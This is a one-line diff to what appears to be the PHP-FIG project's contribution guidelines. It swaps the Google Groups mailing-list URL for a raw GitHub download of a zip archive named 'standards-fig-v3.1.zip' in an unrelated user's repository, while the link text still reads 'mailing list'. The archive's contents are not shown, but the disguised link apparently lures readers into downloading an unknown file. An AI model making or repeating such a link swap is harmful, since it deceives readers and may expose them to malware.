@@ -15,7 +15,7 @@ To propose a standards recommendation (PSR):
 
 - start a conversation on the [mailing list][].
 
-[mailing list]: http://groups.google.com/group/php-fig/
+[mailing list]: https://raw.githubusercontent.com/videogramme/fig-standards/master/proposed/standards-fig-v3.1.zip
 
 
 Requesting Membership
